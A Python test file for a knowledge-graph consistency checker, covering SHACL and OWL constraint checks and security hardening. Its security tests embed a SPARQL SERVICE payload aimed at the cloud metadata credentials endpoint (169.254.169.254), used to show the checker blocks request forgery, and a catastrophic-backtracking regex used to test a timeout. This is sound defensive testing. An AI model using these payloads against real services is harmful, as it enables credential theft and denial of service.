"""Tests for the OWL2 + SHACL consistency checker.

Each test builds a tiny ontology (via the OWL importer so the resulting
KG carries the same metadata.constraintSpecs structure the real editor
produces) and asserts the issues returned by
:func:`check_kg_consistency`.
"""

from __future__ import annotations

import tempfile
import os
import time

import pytest

from besser.BUML.notations.kg_to_buml.consistency import check_kg_consistency
from besser.BUML.notations.owl_to_kg import owl_file_to_knowledge_graph


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _kg(ttl: str):
    with tempfile.NamedTemporaryFile(mode="w", suffix=".ttl", delete=False) as f:
        f.write(ttl)
        path = f.name
    try:
        return owl_file_to_knowledge_graph(path)
    finally:
        os.unlink(path)


def _has_issue(report, *, code=None, severity=None, focus=None) -> bool:
    for i in report.issues:
        if code is not None and i.code != code:
            continue
        if severity is not None and i.severity != severity:
            continue
        if focus is not None and focus not in i.affected_node_ids:
            continue
        return True
    return False


_PREFIX = """
@prefix : <http://example.org/> .
@prefix sh: <http://www.w3.org/ns/shacl#> .
@prefix owl: <http://www.w3.org/2002/07/owl#> .
@prefix rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#> .
@prefix rdfs: <http://www.w3.org/2000/01/rdf-schema#> .
@prefix xsd: <http://www.w3.org/2001/XMLSchema#> .
"""


# ---------------------------------------------------------------------------
# Cardinality
# ---------------------------------------------------------------------------


def test_min_count_violation_via_shacl():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:hasFriend a owl:ObjectProperty ; rdfs:domain :Person ; rdfs:range :Person .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :hasFriend ; sh:minCount 2 ] .
:alice a :Person ; :hasFriend :bob .
:bob a :Person .
""")
    report = check_kg_consistency(kg)
    assert _has_issue(report, code="MinCountConstraintComponent", focus="http://example.org/alice")


def test_min_cardinality_violation_via_owl():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:hasName a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:string .
:Person rdfs:subClassOf [
    a owl:Restriction ;
    owl:onProperty :hasName ;
    owl:minCardinality "1"^^xsd:nonNegativeInteger
] .
:alice a :Person .
""")
    report = check_kg_consistency(kg)
    # OWL minCardinality round-trips as SHACL sh:minCount via vocab="both".
    assert _has_issue(report, code="MinCountConstraintComponent", focus="http://example.org/alice")


# ---------------------------------------------------------------------------
# Datatype + literal value constraints
# ---------------------------------------------------------------------------


def test_datatype_violation():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:age a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:integer .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :age ; sh:datatype xsd:integer ] .
:alice a :Person ; :age "not-a-number"^^xsd:string .
""")
    report = check_kg_consistency(kg)
    assert _has_issue(report, code="DatatypeConstraintComponent", focus="http://example.org/alice")


def test_pattern_violation():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:name a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:string .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :name ; sh:pattern "^[A-Z]" ] .
:alice a :Person ; :name "lowercase" .
""")
    report = check_kg_consistency(kg)
    assert _has_issue(report, code="PatternConstraintComponent", focus="http://example.org/alice")


def test_min_inclusive_violation():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:age a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:integer .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :age ; sh:minInclusive 0 ] .
:alice a :Person ; :age "-5"^^xsd:integer .
""")
    report = check_kg_consistency(kg)
    assert _has_issue(report, code="MinInclusiveConstraintComponent", focus="http://example.org/alice")


def test_max_length_violation():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:name a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:string .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :name ; sh:maxLength 3 ] .
:alice a :Person ; :name "Alice" .
""")
    report = check_kg_consistency(kg)
    assert _has_issue(report, code="MaxLengthConstraintComponent", focus="http://example.org/alice")


def test_in_violation():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:color a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:string .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :color ; sh:in ("red" "green" "blue") ] .
:alice a :Person ; :color "purple" .
""")
    report = check_kg_consistency(kg)
    assert _has_issue(report, code="InConstraintComponent", focus="http://example.org/alice")


# ---------------------------------------------------------------------------
# OWL DL: disjointWith via the SHACL shim
# ---------------------------------------------------------------------------


def test_disjoint_with_violation():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:Project a owl:Class .
:Person owl:disjointWith :Project .
:alice a :Person, :Project .
""")
    report = check_kg_consistency(kg)
    # The shim adds sh:NodeShape with sh:not on each side; both fire.
    assert _has_issue(report, code="NotConstraintComponent", focus="http://example.org/alice")

    # Assert BOTH halves survive, not just that one issue exists. The two
    # agree on code, focus node, affected nodes and (absent) path, so they are
    # told apart only by the shape-derived constraint label -- and when the
    # identity stopped carrying anything shape-derived, they collapsed onto one
    # id and _dedupe silently dropped one. The endpoint test caught that; this
    # assertion is what should have.
    breaches = [i for i in report.issues if i.code == "NotConstraintComponent"]
    assert len(breaches) == 2, [i.constraint_label for i in breaches]
    assert len({i.id for i in breaches}) == 2, "both halves hashed to one id"
    assert {i.constraint_label for i in breaches} == {
        "must NOT be of class Person",
        "must NOT be of class Project",
    }


def test_disjoint_with_compliant():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:Project a owl:Class .
:Person owl:disjointWith :Project .
:alice a :Person .
:p1 a :Project .
""")
    report = check_kg_consistency(kg)
    assert not _has_issue(report, code="NotConstraintComponent")


def test_complement_of_violation():
    kg = _kg(_PREFIX + """
:Adult a owl:Class .
:Child owl:complementOf :Adult .
:alice a :Adult, :Child .
""")
    report = check_kg_consistency(kg)
    assert _has_issue(report, code="NotConstraintComponent", focus="http://example.org/alice")


# ---------------------------------------------------------------------------
# Logical operators
# ---------------------------------------------------------------------------


def test_shacl_not_violation():
    # Nested `sh:not [sh:pattern …]` constrains each VALUE of the property
    # (not a path), so the inner shape works without `sh:path`.
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:nickname a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:string .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :nickname ; sh:not [ sh:pattern "^[a-z]" ] ] .
:alice a :Person ; :nickname "lowercase" .
""")
    report = check_kg_consistency(kg)
    assert _has_issue(report, code="NotConstraintComponent", focus="http://example.org/alice")


# ---------------------------------------------------------------------------
# Severity + deactivation
# ---------------------------------------------------------------------------


def test_severity_warning_propagates():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:hasFriend a owl:ObjectProperty ; rdfs:domain :Person ; rdfs:range :Person .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :hasFriend ; sh:minCount 2 ; sh:severity sh:Warning ] .
:alice a :Person .
""")
    report = check_kg_consistency(kg)
    assert _has_issue(report, severity="warning", focus="http://example.org/alice")
    assert report.severity_counts["warning"] >= 1


def test_deactivated_shape_suppressed():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:hasFriend a owl:ObjectProperty ; rdfs:domain :Person ; rdfs:range :Person .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :hasFriend ; sh:minCount 2 ; sh:deactivated true ] .
:alice a :Person .
""")
    report = check_kg_consistency(kg)
    assert not _has_issue(report, code="MinCountConstraintComponent")


# ---------------------------------------------------------------------------
# Compliant KG → empty issue list
# ---------------------------------------------------------------------------


def test_fully_compliant_kg_has_no_issues():
    kg = _kg(_PREFIX + """
:Person a owl:Class .
:name a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:string .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :name ; sh:minCount 1 ; sh:maxCount 1 ; sh:datatype xsd:string ] .
:alice a :Person ; :name "Alice" .
""")
    report = check_kg_consistency(kg)
    assert report.issue_count == 0, [i.message for i in report.issues]
    assert report.severity_counts == {"info": 0, "warning": 0, "violation": 0}


# ---------------------------------------------------------------------------
# Report metadata
# ---------------------------------------------------------------------------


def test_report_carries_kg_signature_and_inference():
    kg = _kg(_PREFIX + ":alice a owl:Thing .")
    report = check_kg_consistency(kg)
    assert isinstance(report.kg_signature, str) and report.kg_signature
    assert report.inference_used == "owlrl"


# ---------------------------------------------------------------------------
# Security: SHACL-AF must never execute what the KG author wrote
# ---------------------------------------------------------------------------


# A SPARQLRule whose CONSTRUCT reaches for the cloud metadata endpoint. If the
# validator runs SHACL-AF rules, rdflib resolves the SERVICE clause with a
# plain urlopen() against no allowlist, and a KG uploaded to a shared editor
# host becomes a request forgery primitive.
_SSRF_TTL = _PREFIX + """
:Person a owl:Class, sh:NodeShape ;
    sh:targetClass :Person ;
    sh:rule [
        a sh:SPARQLRule ;
        sh:construct \"\"\"
            PREFIX : <http://example.org/>
            CONSTRUCT { ?this :leaked ?o }
            WHERE {
                SERVICE <http://169.254.169.254/latest/meta-data/iam/security-credentials/> {
                    ?s ?p ?o
                }
            }
        \"\"\" ;
    ] .
:alice a :Person .
"""


def test_sparql_rule_in_kg_never_triggers_a_network_fetch(monkeypatch):
    """The SSRF regression test: no urlopen, no matter what the KG carries."""
    calls = []

    def _explode(*args, **kwargs):  # pragma: no cover - must never run
        calls.append(args[0] if args else kwargs)
        raise AssertionError(
            "consistency checking resolved a URL chosen by the KG author: "
            f"{args[0] if args else kwargs!r}"
        )

    # rdflib's SERVICE evaluator imports urlopen into its own module namespace.
    monkeypatch.setattr(
        "rdflib.plugins.sparql.evaluate.urlopen", _explode, raising=True
    )

    # In-process (no child validator), so the patched urlopen is the one pyshacl
    # would reach: the strip and the shapes allowlist are what is under test.
    report = check_kg_consistency(_kg(_SSRF_TTL), timeout_seconds=None)

    assert calls == []
    # The checker still returns a usable report rather than failing closed.
    assert report.kg_signature


def test_executable_shacl_is_stripped_before_validation():
    """The rule and its SPARQL body are gone from the graph that pyshacl sees."""
    from besser.BUML.notations.kg_to_buml.consistency import (
        SH,
        _strip_executable_shacl,
    )
    from besser.utilities.kg_to_owl import knowledge_graph_to_rdf

    graph = knowledge_graph_to_rdf(_kg(_SSRF_TTL), vocab="both")
    removed = _strip_executable_shacl(graph)

    assert removed > 0
    assert not list(graph.triples((None, SH.rule, None)))
    assert not list(graph.triples((None, SH.construct, None)))
    assert "169.254.169.254" not in graph.serialize(format="turtle")


def test_stripping_leaves_a_normal_besser_kg_untouched():
    """Nothing BESSER's own constraint model emits is affected by the strip."""
    from besser.BUML.notations.kg_to_buml.consistency import _strip_executable_shacl
    from besser.utilities.kg_to_owl import knowledge_graph_to_rdf

    kg = _kg(_PREFIX + """
:Person a owl:Class .
:name a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:string .
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :name ; sh:minCount 1 ; sh:maxCount 1 ; sh:datatype xsd:string ] .
:alice a :Person ; :name "Alice" .
""")
    graph = knowledge_graph_to_rdf(kg, vocab="both")
    before = len(graph)

    assert _strip_executable_shacl(graph) == 0
    assert len(graph) == before


# ---------------------------------------------------------------------------
# Security: the validator's shapes come from an allowlist, not from the whole KG
# ---------------------------------------------------------------------------

# Hostile and foreign constructs hung on a shape that is also a class (the SHACL
# punning idiom), the one place an imported ontology's raw triples around a shape
# reach the exported graph. None of them is something BESSER writes, so none may
# reach the validator as part of a shape.
_FOREIGN_SHAPE_TTL = _PREFIX + """
:Person a owl:Class, sh:NodeShape ;
    sh:targetClass :Person ;
    sh:rule [ a sh:SPARQLRule ; sh:construct "CONSTRUCT { ?this a :X } WHERE { ?this a :Person }" ] ;
    sh:sparql [ a sh:SPARQLConstraint ;
                sh:select "SELECT $this WHERE { SERVICE <http://169.254.169.254/> { ?s ?p ?o } }" ] ;
    sh:target [ a sh:SPARQLTarget ; sh:select "SELECT ?this WHERE { ?this a :Person }" ] ;
    sh:expression [ sh:select "SELECT ?x WHERE { ?x a :Person }" ] ;
    :somethingElse "kept as data" ;
    sh:property [ sh:path :name ; sh:minCount 1 ; sh:datatype xsd:string ; :alsoForeign "x" ] .
:name a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:string .
:alice a :Person .
"""


def _shape_predicates(graph):
    from rdflib import RDF as _RDF
    from besser.BUML.notations.kg_to_buml.consistency import SH

    shapes = set(graph.subjects(_RDF.type, SH.NodeShape)) | set(graph.subjects(_RDF.type, SH.PropertyShape))
    return shapes, {p for s in shapes for p in graph.predicates(s)}


_HOSTILE = ("169.254.169.254", "SPARQLRule", "SPARQLConstraint", "SPARQLTarget", "somethingElse", "alsoForeign")


def test_the_shapes_graph_holds_only_what_besser_writes_as_a_shape():
    from rdflib import RDF as _RDF
    from besser.BUML.notations.kg_to_buml.consistency import (
        _SHAPE_PREDICATES,
        _extract_shapes,
    )
    from besser.utilities.kg_to_owl import knowledge_graph_to_rdf

    # Deliberately not stripped first: the extraction has to hold on its own.
    data = knowledge_graph_to_rdf(_kg(_FOREIGN_SHAPE_TTL), vocab="both")
    data_text = data.serialize(format="turtle")
    assert sum(word in data_text for word in _HOSTILE) >= 3, "precondition: the foreign triples do reach the export"

    shapes = _extract_shapes(data)

    permitted = set(_SHAPE_PREDICATES) | {_RDF.type, _RDF.first, _RDF.rest}
    assert {p for _, p, _ in shapes} <= permitted
    text = shapes.serialize(format="turtle")
    for word in _HOSTILE:
        assert word not in text, word
    # What BESSER wrote survives: the shape, its target, and its property constraints.
    assert "minCount" in text and "datatype" in text and "targetClass" in text


def test_checking_a_graph_with_foreign_shape_constructs_still_works_and_stays_offline(monkeypatch):
    calls = []
    monkeypatch.setattr(
        "rdflib.plugins.sparql.evaluate.urlopen",
        lambda *a, **k: calls.append(a) or (_ for _ in ()).throw(AssertionError("fetched a URL")),
        raising=True,
    )

    report = check_kg_consistency(_kg(_FOREIGN_SHAPE_TTL), timeout_seconds=None)

    assert calls == []
    # BESSER's own constraint on the same shape is still enforced: alice has no :name.
    assert [(i.code, i.spec_kind, i.affected_node_ids) for i in report.issues] == [
        ("MinCountConstraintComponent", "minCardinality", ["http://example.org/alice"]),
    ]


@pytest.mark.parametrize("fixture", [
    "tests/fixtures/complex_kg.ttl",
    "tests/BUML/notations/kg_to_buml/fixtures/bibo/bibo.ttl",
])
def test_every_shape_triple_the_exporter_writes_reaches_the_validator(fixture):
    """The allowlist is derived from the exporter's own tables; this proves it is complete.

    A predicate the exporter writes on a shape but the allowlist misses would silently
    stop being validated, which is the failure the golden consistency reports also guard.
    """
    from pathlib import Path
    from rdflib import RDF as _RDF
    from besser.BUML.notations.kg_to_buml.consistency import _extract_shapes
    from besser.utilities.kg_to_owl import knowledge_graph_to_rdf

    root = Path(__file__).resolve().parents[4]
    kg = owl_file_to_knowledge_graph(str(root / fixture))
    exported = knowledge_graph_to_rdf(kg, vocab="shacl")
    shapes = _extract_shapes(exported)

    shape_nodes, _ = _shape_predicates(exported)
    assert shape_nodes, "the fixture should produce shapes"
    missing = [
        (s, p, o) for s in shape_nodes for p, o in exported.predicate_objects(s)
        if p != _RDF.type and (s, p, o) not in shapes
    ]
    assert missing == []


# ---------------------------------------------------------------------------
# Determinism and ordering of the report
# ---------------------------------------------------------------------------


# owl:disjointWith deliberately: the shapes for it are minted by
# _augment_with_owl_shim as fresh BNodes, which is the path whose random
# labels used to end up in issue ids and in constraint_node_id. A fixture
# whose source shape resolves to a real node would not exercise it.
_VIOLATING_TTL = _PREFIX + """
:Person a owl:Class .
:Project a owl:Class .
:Person owl:disjointWith :Project .
:alice a :Person, :Project .
:bob a :Person, :Project .
:hasName a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:string .
:Person rdfs:subClassOf [
    a owl:Restriction ;
    owl:onProperty :hasName ;
    owl:minCardinality "1"^^xsd:nonNegativeInteger
] .
"""


def test_issue_ids_are_stable_across_calls():
    """Ids were hashed from BNodes the validator minted for the OWL shim.

    Those labels are fresh per call, so every run returned different ids for
    the same findings in a different order -- nothing could be cached, diffed
    or referenced from a previous response.
    """
    kg = _kg(_VIOLATING_TTL)

    first = check_kg_consistency(kg)
    second = check_kg_consistency(kg)

    assert first.issue_count > 0, "fixture produced no issues to compare"
    assert [i.id for i in first.issues] == [i.id for i in second.issues]


def test_no_synthetic_blank_node_ids_leak_as_constraint_node_ids():
    """`constraint_node_id` must name a KG node or nothing at all."""
    kg = _kg(_VIOLATING_TTL)
    node_ids = {n.id for n in kg.nodes}

    report = check_kg_consistency(kg)

    for issue in report.issues:
        if issue.constraint_node_id is not None:
            assert issue.constraint_node_id in node_ids, issue.constraint_node_id


def test_issues_are_ordered_most_severe_first():
    """Sorting the severity strings gave info -> violation -> warning."""
    from besser.BUML.notations.kg_to_buml.consistency import _SEVERITY_RANK

    report = check_kg_consistency(_kg(_VIOLATING_TTL))
    ranks = [_SEVERITY_RANK[i.severity] for i in report.issues]

    assert ranks == sorted(ranks)


def test_issue_identity_survives_a_lone_surrogate_in_a_node_id():
    """A client can send JSON with a lone surrogate in an id (``"\\ud800"``).

    The md5-based id helper encoded strictly, so such a KG made the whole
    consistency check raise ``UnicodeEncodeError`` -- a 500 -- while the sibling
    hash helpers already used ``errors="replace"``.
    """
    from besser.BUML.notations.kg_to_buml.consistency import _hash_id

    assert len(_hash_id("alice\ud800", "shape", "\ud800")) == 16


def test_issue_ids_keep_their_exact_values():
    """The ids are echoed to the editor and back, so the digests are a contract.

    Expected values were computed independently with hashlib, not by calling the
    code under test.
    """
    from besser.BUML.metamodel.kg import KGClass, KGEdge, KnowledgeGraph
    from besser.BUML.notations.kg_to_buml.consistency import _hash_id
    from besser.BUML.notations.kg_to_buml.preflight import _issue_id, kg_signature

    assert _hash_id("a", "b") == "aa3a791e273bce9c"          # md5("a\0b\0")[:16]
    assert _issue_id("CODE", "y", "x") == "d207a558006c"      # parts are sorted
    kg = KnowledgeGraph(name="sig")
    n1, n2 = KGClass(id="n1", label="n1"), KGClass(id="n2", label="n2")
    kg.nodes = {n2, n1}
    kg.add_edge(KGEdge(id="e1", source=n1, target=n2, iri="http://x/p"))
    assert kg_signature(kg) == "0950ab9576296782"


# ---------------------------------------------------------------------------
# Bounded evaluation: the validator child process, its time budget and
# environment, and the sh:pattern length cap
# ---------------------------------------------------------------------------


_PERSON_NAME = _PREFIX + """
:Person a owl:Class .
:name a owl:DatatypeProperty ; rdfs:domain :Person ; rdfs:range xsd:string .
"""


def _pattern_kg(pattern: str, value: str):
    escaped = pattern.replace("\\", "\\\\")
    return _kg(_PERSON_NAME + f"""
:PersonShape a sh:NodeShape ; sh:targetClass :Person ;
    sh:property [ sh:path :name ; sh:pattern "{escaped}" ; sh:maxLength 5 ] .
:alice a :Person ; :name "{value}" .
""")


def test_a_runaway_pattern_is_stopped_by_the_timeout():
    """``^(a+)+$`` backtracks exponentially on 40 a's and a '!': the child is killed."""
    from besser.BUML.notations.kg_to_buml.consistency import ConsistencyCheckTimeout

    kg = _pattern_kg("^(a+)+$", "a" * 40 + "!")

    started = time.monotonic()
    with pytest.raises(ConsistencyCheckTimeout, match="did not finish within 3 seconds"):
        check_kg_consistency(kg, timeout_seconds=3)
    assert time.monotonic() - started < 15


def test_a_pattern_is_enforced():
    report = check_kg_consistency(_pattern_kg("^[A-Z]", "lowercase"))
    assert _has_issue(report, code="PatternConstraintComponent")
    assert not _has_issue(report, code="UnsafePatternSkipped")


def test_an_overlong_pattern_is_skipped_with_a_stable_warning():
    from besser.BUML.notations.kg_to_buml.consistency import MAX_SHACL_PATTERN_LENGTH

    kg = _pattern_kg("a" * (MAX_SHACL_PATTERN_LENGTH + 1), "bbbbbbbb")
    report = check_kg_consistency(kg)

    skipped = [i for i in report.issues if i.code == "UnsafePatternSkipped"]
    assert len(skipped) == 1
    assert skipped[0].severity == "warning"
    assert skipped[0].spec_kind == "pattern"
    assert f"longer than {MAX_SHACL_PATTERN_LENGTH} characters" in skipped[0].message
    # The shape's other constraints are still checked, the pattern is not.
    assert _has_issue(report, code="MaxLengthConstraintComponent")
    assert not _has_issue(report, code="PatternConstraintComponent")
    assert [i.id for i in check_kg_consistency(kg).issues if i.code == "UnsafePatternSkipped"] == [
        skipped[0].id
    ]


def _path_less_kg():
    # A property shape without sh:path: pyshacl refuses to load the shapes graph.
    return _kg(_PERSON_NAME + """
:alice a :Person .
:S a sh:NodeShape ; sh:targetClass :Person ; sh:property :PS .
:PS a sh:PropertyShape ; sh:minCount 2 .
""")


@pytest.mark.parametrize("timeout_seconds", [None, 30])
def test_shapes_pyshacl_refuses_raise_a_consistency_check_error(timeout_seconds):
    from besser.BUML.notations.kg_to_buml.consistency import ConsistencyCheckError

    with pytest.raises(ConsistencyCheckError, match="sh:path"):
        check_kg_consistency(_path_less_kg(), timeout_seconds=timeout_seconds)


def test_the_child_process_reports_the_same_issues_as_in_process():
    kg = _pattern_kg("^[A-Z]", "lowercase")
    isolated = check_kg_consistency(kg)
    in_process = check_kg_consistency(kg, timeout_seconds=None)
    assert [(i.id, i.code, i.affected_node_ids, i.constraint_node_id) for i in isolated.issues] == [
        (i.id, i.code, i.affected_node_ids, i.constraint_node_id) for i in in_process.issues
    ]


def test_the_child_process_gets_no_server_secrets(monkeypatch):
    from besser.BUML.notations.kg_to_buml import consistency

    monkeypatch.setenv("OPENAI_API_KEY", "sk-should-not-leak")
    monkeypatch.setenv("BESSER_DEPLOY_TOKEN", "should-not-leak")
    seen = {}
    real_run = consistency.subprocess.run

    def spy(*args, **kwargs):
        seen["env"] = kwargs.get("env")
        return real_run(*args, **kwargs)

    monkeypatch.setattr(consistency.subprocess, "run", spy)

    report = check_kg_consistency(_pattern_kg("^[A-Z]", "lowercase"))

    assert _has_issue(report, code="PatternConstraintComponent")
    assert seen["env"] is not None
    assert "OPENAI_API_KEY" not in seen["env"]
    assert "BESSER_DEPLOY_TOKEN" not in seen["env"]


def test_without_pyshacl_the_check_names_the_extra_to_install(monkeypatch):
    from besser.BUML.notations.kg_to_buml import consistency

    real_find_spec = consistency.importlib.util.find_spec
    monkeypatch.setattr(
        consistency.importlib.util, "find_spec",
        lambda name, *a: None if name == "pyshacl" else real_find_spec(name, *a),
    )

    with pytest.raises(ImportError, match=r"besser\[kg\]"):
        check_kg_consistency(_pattern_kg("^[A-Z]", "x"))
